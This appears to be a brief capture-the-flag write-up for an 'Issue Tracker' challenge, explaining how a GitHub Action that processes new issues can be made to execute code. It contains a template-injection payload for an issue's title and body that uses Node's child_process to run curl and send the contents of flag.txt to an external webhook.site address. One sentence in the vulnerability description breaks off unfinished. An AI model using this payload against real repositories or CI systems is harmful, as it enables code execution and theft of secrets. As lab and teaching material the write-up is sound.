# Issue Tracker
## Author: Helen O'Connell (hsoconne)
## Team: 0wnth3pwn
**Vulnerability** <br>
When a new issue is created, a Github Action runs. Within this action, there is a possibility of code execution. The title and body of these <br>
**Step 1** <br>
Create a new issue <br>
**Step 2** <br>
Make the following code block the body and title. Using a webhook site to send the flag too.
`{{process.mainModule.require('child_process').exec('curl -XPOST -d "$(cat flag.txt)" https://webhook.site/c6d14f4c-9d88-47a9-90a4-dde982b6893f')%7D%7D`
<br>
**Step Three** <br>
Check the webhook site for the contents of the flag.txt file. For ours, was accessible at (https://webhook.site/c6d14f4c-9d88-47a9-90a4-dde982b6893f)
<br>
